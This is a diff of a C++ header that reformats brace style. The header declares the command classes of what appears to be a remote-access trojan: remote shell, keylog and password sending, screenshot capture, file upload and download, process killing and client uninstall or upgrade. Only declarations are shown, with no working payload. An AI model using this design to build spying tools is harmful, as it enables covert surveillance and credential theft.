@@ -7,67 +7,56 @@
 #include <malicious/Screenshot.hpp>
 #include "SlaveAbstractFunction.hpp"
 
-namespace Inhibition
-{
+namespace Inhibition {
 	class ProgramStartupKey;
 	class Screenshot;
 
-	class RemoteShell : public SlaveAbstractFunction
-	{
+	class RemoteShell : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
 
-	class BrowseFileTree : public SlaveAbstractFunction
-	{
+	class BrowseFileTree : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
 
-	class StartDownload : public SlaveAbstractFunction
-	{
+	class StartDownload : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
 
-	class StartUpload : public SlaveAbstractFunction
-	{
+	class StartUpload : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
 
-	class UninstallClient : public SlaveAbstractFunction
-	{
+	class UninstallClient : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
 
-	class KillClient : public SlaveAbstractFunction
-	{
+	class KillClient : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
 
-	class UpgradeClient : public SlaveAbstractFunction
-	{
+	class UpgradeClient : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
 
-	class RebootClient : public SlaveAbstractFunction
-	{
+	class RebootClient : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
 
-	class SendEmail : public SlaveAbstractFunction
-	{
+	class SendEmail : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
 
-	class SendKeylog : public SlaveAbstractFunction
-	{
+	class SendKeylog : public SlaveAbstractFunction {
 		public:
 			SendKeylog(Keyboard::KeyLogObserver * keyLogObserverArg);
 			virtual void operator()();
@@ -75,66 +64,56 @@ namespace Inhibition
 			Keyboard::KeyLogObserver * keyLogObserver;
 	};
 
-	class SendScreenshot : public SlaveAbstractFunction
-	{
+	class SendScreenshot : public SlaveAbstractFunction {
 		public:
 			SendScreenshot(Malicious::Screenshot& screenshooter_ref)
-			:screenshooter(screenshooter_ref){}
+				:screenshooter(screenshooter_ref) {}
 			virtual void operator()();
 		private:
 			Malicious::Screenshot& screenshooter;
 	};
 
-	class SendPasswords : public SlaveAbstractFunction
-	{
+	class SendPasswords : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
 
-	class SendProcessList : public SlaveAbstractFunction
-	{
+	class SendProcessList : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
 
-	class KillProcess : public SlaveAbstractFunction
-	{
+	class KillProcess : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
 
-	class SendWindowsVersion : public SlaveAbstractFunction
-	{
+	class SendWindowsVersion : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
 
-	class SendClientName : public SlaveAbstractFunction
-	{
+	class SendClientName : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
 
-	class Shutdown : public SlaveAbstractFunction
-	{
+	class Shutdown : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
 
-	class Reboot : public SlaveAbstractFunction
-	{
+	class Reboot : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
 
-	class Logout : public SlaveAbstractFunction
-	{
+	class Logout : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
 
-	class Hibernate : public SlaveAbstractFunction
-	{
+	class Hibernate : public SlaveAbstractFunction {
 		public:
 			virtual void operator()();
 	};
